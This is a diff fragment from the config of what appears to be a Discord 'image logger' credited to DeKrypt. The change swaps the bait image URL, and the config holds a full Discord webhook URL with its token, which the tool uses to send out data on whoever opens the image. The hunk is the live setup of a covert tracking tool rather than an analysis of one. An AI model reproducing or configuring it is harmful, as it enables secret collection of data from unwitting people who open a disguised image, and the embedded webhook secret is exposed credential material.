@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1482874174371401760/HcUi2R9hrZR02-A3DklBYFOqvkMqi8MsemsivcOn0m8grP1DM7kD_yEeNzJY8yjDLUrt",
-    "image": "https://www.deviantart.com/kylewithem/art/Mike-Wazowski-Meme-Png-977799638", # You can also have a custom image by using a URL argument
+    "image": "https://www.adobe.com/tr/creativecloud/file-types/image/raster/media_19531d2c5f311776c67e44b76083db13309004956.png?width=2000&format=webply&optimize=medium", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
